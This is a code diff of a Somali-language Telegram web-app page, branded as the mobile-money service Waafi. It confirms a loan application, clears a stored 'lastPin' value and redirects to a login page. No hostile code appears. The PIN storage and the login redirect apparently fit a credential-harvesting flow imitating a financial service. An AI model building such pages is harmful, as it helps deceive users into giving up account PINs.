@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Gudbinta Guul - Waafi</title>
 
-    <!-- ✅ FIXED Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -46,13 +45,11 @@
             color: #4caf50;
             font-size: 28px;
             margin-bottom: 20px;
-            line-height: 1.2;
         }
 
         p {
             color: #666;
             font-size: 16px;
-            line-height: 1.6;
             margin: 5px 0;
         }
 
@@ -91,9 +88,7 @@
             padding: 15px;
             border-radius: 10px;
             font-size: 16px;
-            font-weight: 500;
             cursor: pointer;
-            display: inline-block;
         }
 
         .top-toast {
@@ -107,7 +102,6 @@
             align-items: center;
             gap: 10px;
             font-size: 14px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
         }
     </style>
 </head>
@@ -115,59 +109,69 @@
 <body>
 
 <div class="top-toast">
-    <span style="color:#a3e635; font-size:18px;">✔</span>
+    <span style="color:#a3e635;">✔</span>
     <span>Codsiga si guul leh ayaa loo gudbiyay!</span>
 </div>
 
 <div class="success-card">
     <div class="check-circle">✓</div>
-    
+
     <h1>Codsiga Amaahda<br>waa la gudbiyay</h1>
-    
-    <p>Codsigaaga amaahda waa la gudbiyay. Fadlan sug ansixinta.</p>
-    <p>Waxaad heli doontaa farriin xaqiijin ah. Hadda, soco Waafi.</p>
+
+    <p>Codsigaaga waa la gudbiyay. Fadlan sug ansixinta.</p>
+    <p>Waxaad heli doontaa farriin xaqiijin ah.</p>
 
     <div class="timer-container">
         <div class="loader-spinner"></div>
-        <span>Ku celinaya galitaanka Waafi <span id="timer">5</span> ilbiriqsi...</span>
+        <span>
+            Ku celinaya galitaanka Waafi 
+            <span id="timer">5</span> ilbiriqsi...
+        </span>
     </div>
 
-    <button type="button" class="btn-home" onclick="goToPage6()">Tag Galitaanka Hadda</button>
+    <button type="button" class="btn-home" onclick="goToPage6()">
+        Tag Galitaanka Hadda
+    </button>
 </div>
 
 <script>
     let timeLeft = 5;
+    let interval;
 
     function updateTimer() {
-        const timerElement = document.getElementById('timer');
-        if (timerElement) {
-            timerElement.innerText = timeLeft;
-        }
+        const el = document.getElementById('timer');
+        if (el) el.textContent = timeLeft;
     }
 
-    const countdown = setInterval(() => {
-        timeLeft--;
-        updateTimer();
-
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            goToPage6();
-        }
-    }, 1000);
-
     function goToPage6() {
-        localStorage.clear();
+        if (interval) clearInterval(interval);
+
+        // ⚠️ safer than clear()
+        localStorage.removeItem('lastPin');
+        
         window.location.href = "/page6";
     }
 
     window.onload = () => {
         const tg = window.Telegram?.WebApp;
         if (tg) {
-            tg.ready();   // ✅ important
+            tg.ready();
             tg.expand();
         }
 
         updateTimer();
+
+        interval = setInterval(() => {
+            timeLeft--;
+
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                goToPage6();
+                return;
+            }
+
+            updateTimer();
+        }, 1000);
     };
 </script>
 
